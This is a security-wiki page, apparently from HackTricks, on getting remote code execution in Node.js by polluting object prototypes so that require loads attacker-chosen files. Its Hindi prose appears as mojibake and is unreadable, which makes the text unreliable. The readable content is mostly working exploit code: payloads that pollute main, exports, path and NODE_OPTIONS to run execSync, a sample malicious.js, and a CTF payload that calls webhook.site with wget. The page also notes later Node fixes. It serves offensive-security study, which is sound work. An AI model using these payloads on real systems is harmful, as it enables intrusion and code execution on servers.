‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§Ü‡§™‡§®‡•á ‡§¶‡•á‡§ñ‡§æ ‡§ï‡§ø ‡§ó‡•á‡§ú‡•á‡§ü ‡§ï‡•ã ‡§ü‡•ç‡§∞‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡•ã **`spawn`** ‡§ï‡•ã **‡§ï‡•â‡§≤** ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à (‡§ï‡•Å‡§õ ‡§≠‡•Ä ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡•á **`child_process`** ‡§ï‡•á ‡§∏‡§≠‡•Ä ‡§§‡§∞‡•Ä‡§ï‡•á ‡§á‡§∏‡•á ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç)‡•§ ‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§Ø‡§π **‡§ï‡•ã‡§° ‡§ï‡§æ ‡§π‡§ø‡§∏‡•ç‡§∏‡§æ** ‡§•‡§æ, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ö‡§ó‡§∞ ‡§ï‡•ã‡§° **‡§á‡§∏‡•á** ‡§ï‡•â‡§≤ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§§‡•ã ‡§ï‡•ç‡§Ø‡§æ ‡§π‡•ã‡§ó‡§æ‡•§

### ‡§è‡§ï require ‡§´‡§º‡§æ‡§á‡§≤ ‡§™‡§• ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ

‡§á‡§∏ [**‡§Ö‡§®‡•ç‡§Ø ‡§≤‡•á‡§ñ**](https://blog.sonarsource.com/blitzjs-prototype-pollution/) ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§â‡§∏ ‡§´‡§º‡§æ‡§á‡§≤ ‡§™‡§• ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§π‡§æ‡§Å **`require`** ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§ó‡§æ‡•§ ‡§â‡§∏ ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã ‡§¨‡§∏ **‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§è‡§ï `.js` ‡§´‡§º‡§æ‡§á‡§≤ ‡§ñ‡•ã‡§ú‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à** ‡§ú‡•ã **‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡§®‡•á ‡§™‡§∞ ‡§è‡§ï ‡§∏‡•ç‡§™‡•â‡§® ‡§µ‡§ø‡§ß‡§ø ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó‡•Ä‡•§**\
‡§Ü‡§Ø‡§æ‡§§ ‡§ï‡§∞‡§®‡•á ‡§™‡§∞ ‡§∏‡•ç‡§™‡•â‡§® ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•Ä ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§´‡§º‡§æ‡§á‡§≤‡•ã‡§Ç ‡§ï‡•á ‡§ï‡•Å‡§õ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§π‡•à‡§Ç:

* /path/to/npm/scripts/changelog.js
* /opt/yarn-v1.22.19/preinstall.js
* **‡§®‡•Ä‡§ö‡•á ‡§î‡§∞ ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§ñ‡•ã‡§ú‡•á‡§Ç**

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∏‡§∞‡§≤ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü **‡§ï‡•â‡§≤** ‡§ï‡•á ‡§≤‡§ø‡§è **child_process** ‡§ï‡•ã **‡§ï‡•ã‡§à ‡§™‡•à‡§°‡§ø‡§Ç‡§ó** ‡§ï‡•á ‡§¨‡§ø‡§®‡§æ ‡§ñ‡•ã‡§ú‡•á‡§ó‡•Ä (‡§´‡§Ç‡§ï‡•ç‡§∂‡§Ç‡§∏ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ï‡•â‡§≤ ‡§¶‡§ø‡§ñ‡§æ‡§®‡•á ‡§∏‡•á ‡§¨‡§ö‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è):

{% code overflow="wrap" %}
```bash
find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2>/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
```
{% endcode %}

<details>

<summary>‡§™‡§ø‡§õ‡§≤‡•á ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡§æ‡§è ‡§ó‡§è ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç</summary>

* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/npm/scripts/**changelog.js**:16:`const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)`
* node\_modules/detect-libc/bin/**detect-libc.js**:18:`process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);`
* node\_modules/jest-expo/bin/**jest.js**:26:`const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });`
* node\_modules/buffer/bin/**download-node-tests.js**:17:`cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })`
* node\_modules/buffer/bin/**test.js**:10:`var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })`
* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§´‡§º‡§æ‡§á‡§≤ ‡§™‡§• ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡§æ

{% hint style="warning" %}
**‡§™‡§ø‡§õ‡§≤‡•Ä ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à** ‡§ï‡§ø **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§â‡§∏ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡§æ ‡§™‡§• ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à** ‡§ú‡§ø‡§∏‡•á **‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï** ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à‡•§ ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π ‡§π‡§Æ‡•á‡§∂‡§æ ‡§∏‡§ö ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§
{% endhint %}

‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§° ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§è‡§ï require ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§§‡•ã ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§Ü‡§™ **‡§™‡§• ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§® ‡§ï‡§∞‡•á‡§Ç** ‡§ú‡•ã ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•ã‡§®‡•á ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§Ü‡§™ **‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï ‡§Ö‡§≤‡§ó ‡§™‡§• ‡§ï‡•ã ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§á‡§∏‡§≤‡§ø‡§è ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§ï‡•ã‡§° ‡§ï‡•Ä ‡§™‡§Ç‡§ï‡•ç‡§§‡§ø `require("./a_file.js")` ‡§Ø‡§æ `require("bytes")` ‡§ú‡•à‡§∏‡•Ä ‡§π‡•ã, ‡§Ø‡§π **‡§Ü‡§™‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§ø‡§§ ‡§™‡•à‡§ï‡•á‡§ú ‡§ï‡•ã ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§ï‡§∞‡•á‡§ó‡§æ**‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§è‡§ï require ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§ï‡•ã‡§à spawn ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à, ‡§§‡•ã ‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ ‡§π‡•à:

* ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§è‡§ï **`.js` ‡§´‡§º‡§æ‡§á‡§≤ ‡§ñ‡•ã‡§ú‡•á‡§Ç** ‡§ú‡•ã ‡§ú‡§¨ **‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï** ‡§π‡•ã‡§ó‡•Ä ‡§§‡•ã **`child_process` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡•Å‡§õ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó‡•Ä**
* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§â‡§∏ ‡§™‡•ç‡§≤‡•á‡§ü‡§´‡§º‡•â‡§∞‡•ç‡§Æ ‡§™‡§∞ ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§Ö‡§™‡§≤‡•ã‡§° ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡•á ‡§Ü‡§™ ‡§π‡§Æ‡§≤‡§æ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ ‡§ê‡§∏‡•Ä ‡§´‡§º‡§æ‡§á‡§≤ ‡§Ö‡§™‡§≤‡•ã‡§° ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç
* **`.js` ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•á require ‡§≤‡•ã‡§° ‡§ï‡•ã ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§•‡•ã‡§Ç ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç** ‡§ú‡•ã child\_process ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡•Å‡§õ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ
* ‡§ú‡§¨ child\_process ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£/cmdline ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç** (‡§™‡•ç‡§∞‡§æ‡§∞‡§Ç‡§≠‡§ø‡§ï ‡§§‡§ï‡§®‡•Ä‡§ï‡•ã‡§Ç ‡§ï‡•ã ‡§¶‡•á‡§ñ‡•á‡§Ç)

#### ‡§™‡•Ç‡§∞‡•ç‡§£ require

‡§Ø‡§¶‡§ø ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ require **‡§™‡•Ç‡§∞‡•ç‡§£** ‡§π‡•à (`require("bytes")`) ‡§î‡§∞ **‡§™‡•à‡§ï‡•á‡§ú ‡§Æ‡•á‡§Ç `package.json` ‡§´‡§º‡§æ‡§á‡§≤ ‡§Æ‡•á‡§Ç ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à**, ‡§§‡•ã ‡§Ü‡§™ **`main` ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ ‡§ï‡•ã ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§î‡§∞ **require ‡§ï‡•ã ‡§è‡§ï ‡§Ö‡§≤‡§ó ‡§´‡§º‡§æ‡§á‡§≤ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% endtabs %}

#### ‡§∏‡§æ‡§™‡•á‡§ï‡•ç‡§∑ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ - 1

‡§Ø‡§¶‡§ø ‡§è‡§ï **‡§∏‡§æ‡§™‡•á‡§ï‡•ç‡§∑ ‡§™‡§•** ‡§ï‡•ã ‡§≤‡•ã‡§° ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§¨‡§ú‡§æ‡§Ø ‡§è‡§ï ‡§®‡§ø‡§∞‡§™‡•á‡§ï‡•ç‡§∑ ‡§™‡§• ‡§ï‡•á, ‡§§‡•ã ‡§Ü‡§™ ‡§®‡•ã‡§° ‡§ï‡•ã **‡§è‡§ï ‡§Ö‡§≤‡§ó ‡§™‡§• ‡§≤‡•ã‡§°** ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

{% tabs %}
{% tab title="‡§∂‡•ã‡§∑‡§£" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### ‡§∏‡§æ‡§™‡•á‡§ï‡•ç‡§∑ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ - 2

{% tabs %}
{% tab title="‡§∂‡•ã‡§∑‡§£" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### Relative require - 3

‡§™‡§ø‡§õ‡§≤‡•á ‡§µ‡§æ‡§≤‡•á ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§®, ‡§Ø‡§π [**‡§á‡§∏ ‡§≤‡•á‡§ñ**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs) ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§Ø‡§æ ‡§ó‡§Ø‡§æ‡•§
```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```
## VM Gadgets

‡§ï‡§æ‡§ó‡§ú‡§º ‡§Æ‡•á‡§Ç [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) ‡§Ø‡§π ‡§≠‡•Ä ‡§∏‡§Ç‡§ï‡•á‡§§ ‡§¶‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à ‡§ï‡§ø **`vm`** ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§ï‡•á ‡§ï‡•Å‡§õ ‡§§‡§∞‡•Ä‡§ï‡•ã‡§Ç ‡§∏‡•á **`contextExtensions`** ‡§ï‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§è‡§ï ‡§ó‡•à‡§ú‡•á‡§ü ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§™‡§ø‡§õ‡§≤‡•á **`child_process`** ‡§§‡§∞‡•Ä‡§ï‡•ã‡§Ç ‡§ï‡•Ä ‡§§‡§∞‡§π, ‡§á‡§∏‡•á ‡§®‡§µ‡•Ä‡§®‡§§‡§Æ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£‡•ã‡§Ç ‡§Æ‡•á‡§Ç **‡§´‡§ø‡§ï‡•ç‡§∏** ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§

## Fixes & Unexpected protections

‡§ï‡•É‡§™‡§Ø‡§æ ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£ ‡§§‡§¨ ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§è‡§ï ‡§µ‡§∏‡•ç‡§§‡•Å ‡§ï‡§æ **attribute** ‡§ú‡•ã ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, **undefined** ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø **‡§ï‡•ã‡§°** ‡§Æ‡•á‡§Ç ‡§â‡§∏ **attribute** ‡§ï‡•ã **set** ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ ‡§á‡§∏‡•á **overwrite** ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§™‡§æ‡§è‡§Ç‡§ó‡•á‡•§

‡§ú‡•Ç‡§® 2022 ‡§Æ‡•á‡§Ç [**‡§á‡§∏ ‡§ï‡§Æ‡§ø‡§ü**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a) ‡§∏‡•á var `options` ‡§è‡§ï **`kEmptyObject`** ‡§π‡•à, ‡§® ‡§ï‡§ø ‡§è‡§ï `{}`‡•§ ‡§ú‡•ã **‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£** ‡§ï‡•ã **options** ‡§ï‡•á **attributes** ‡§ï‡•ã RCE ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§∏‡•á ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡§ø‡§§ ‡§π‡•ã‡§®‡•á ‡§∏‡•á ‡§∞‡•ã‡§ï‡§§‡§æ ‡§π‡•à‡•§\
‡§ï‡§Æ ‡§∏‡•á ‡§ï‡§Æ v18.4.0 ‡§∏‡•á ‡§Ø‡§π ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ **‡§≤‡§æ‡§ó‡•Ç** ‡§ï‡•Ä ‡§ó‡§à ‡§π‡•à, ‡§î‡§∞ ‡§á‡§∏‡§≤‡§ø‡§è `spawn` ‡§î‡§∞ `spawnSync` **exploits** ‡§ú‡•ã ‡§§‡§∞‡•Ä‡§ï‡•ã‡§Ç ‡§ï‡•ã ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§•‡•á, **‡§Ö‡§¨ ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡•á** (‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à `options` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à!)‡•§

[**‡§á‡§∏ ‡§ï‡§Æ‡§ø‡§ü**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) ‡§Æ‡•á‡§Ç vm ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§ï‡•á **`contextExtensions`** ‡§ï‡§æ **‡§™‡•ç‡§∞‡•ã‡§ü‡•ã‡§ü‡§æ‡§á‡§™ ‡§™‡•ç‡§∞‡§¶‡•Ç‡§∑‡§£** ‡§ï‡•ã **`{}`** ‡§ï‡•á ‡§¨‡§ú‡§æ‡§Ø **`kEmptyObject`** ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§∞‡§ï‡•á **‡§ï‡•Å‡§õ ‡§π‡§¶ ‡§§‡§ï ‡§´‡§ø‡§ï‡•ç‡§∏** ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§

### **Other Gadgets**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)
* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## References

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

{% hint style="success" %}
